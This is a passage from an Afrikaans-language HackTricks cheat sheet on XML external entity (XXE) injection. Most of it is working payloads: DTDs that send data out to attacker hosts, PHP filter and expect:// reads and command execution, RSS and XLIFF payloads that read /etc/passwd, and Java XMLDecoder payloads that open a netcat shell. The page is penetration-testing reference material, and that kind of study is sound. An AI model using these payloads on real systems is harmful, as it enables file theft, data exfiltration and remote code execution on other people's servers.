<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Omhulsels

### Base64

**Onttrek** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Onttrek eksterne hulpbron**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Verre kode-uitvoering

**Indien PHP "expect" module gelaai is**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Hierdie voorbeeld is geïnspireer deur [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Lokalisering Uitruil Lêerformaat) word gebruik om data-uitruil in lokaliseringprosesse te standaardiseer. Dit is 'n op XML-gebaseerde formaat wat hoofsaaklik gebruik word vir die oordrag van lokaliseerbare data tussen gereedskap tydens lokalisering en as 'n algemene uitruilformaat vir KOT (Rekenaarondersteunde Vertaling) gereedskap.

### Blinde Versoek Analise

'n Versoek word aan die bediener gestuur met die volgende inhoud:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Egter, hierdie versoek veroorsaak 'n interne bedieningsfout, wat spesifiek 'n probleem met die merkverklarings noem:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Ten spyte van die fout, word 'n tref op Burp Collaborator aangeteken, wat 'n sekere vlak van interaksie met die eksterne entiteit aandui.

Uit Band Data Uitlekking Om data uit te lek, word 'n gewysigde versoek gestuur:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Hierdie benadering onthul dat die Gebruiker Agent aandui dat Java 1.8 gebruik word. 'n Notasiebeperking met hierdie weergawe van Java is die onvermoë om lêers wat 'n nuwe lynkarakter bevat, soos /etc/passwd, te herwin deur die Out of Band-tegniek te gebruik.

Fout-Gebaseerde Data Uitlekking Om hierdie beperking te oorkom, word 'n Fout-Gebaseerde benadering gebruik. Die DTD-lêer is as volg gestruktureer om 'n fout te veroorsaak wat data vanaf 'n teikenglêer insluit:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Die bediener reageer met 'n fout, wat belangrik is om die nie-bestaande lêer te weerspieël, wat aandui dat die bediener poog om toegang tot die gespesifiseerde lêer te verkry:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Om die inhoud van die lêer in die foutboodskap in te sluit, word die DTD-lêer aangepas:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Hierdie wysiging lei tot die suksesvolle uitlek van die lêer se inhoud, soos weerspieël in die foutuitset wat via HTTP gestuur is. Dit dui op 'n suksesvolle XXE (XML Eksterne Entiteit) aanval, wat beide Out of Band en Fout-Gebaseerde tegnieke benut om sensitiewe inligting te onttrek.

## RSS - XEE

Geldige XML met RSS-formaat om 'n XXE kwesbaarheid te benut.

### Ping terug

Eenvoudige HTTP versoek na aanvallers se bediener
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Lees lêer
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Lees bronkode

Met PHP base64 filter
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE na RCE

XMLDecoder is 'n Java klas wat voorwerpe skep gebaseer op 'n XML-boodskap. As 'n skadelike gebruiker 'n aansoek kan kry om arbitrêre data te gebruik in 'n oproep na die metode **readObject**, sal hy dadelik kode-uitvoering op die bediener verkry.

### Gebruik van Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### Prosesbouer
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Gereedskap

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Verwysings

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Haal inligting uit via HTTP deur eie eksterne DTD te gebruik: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
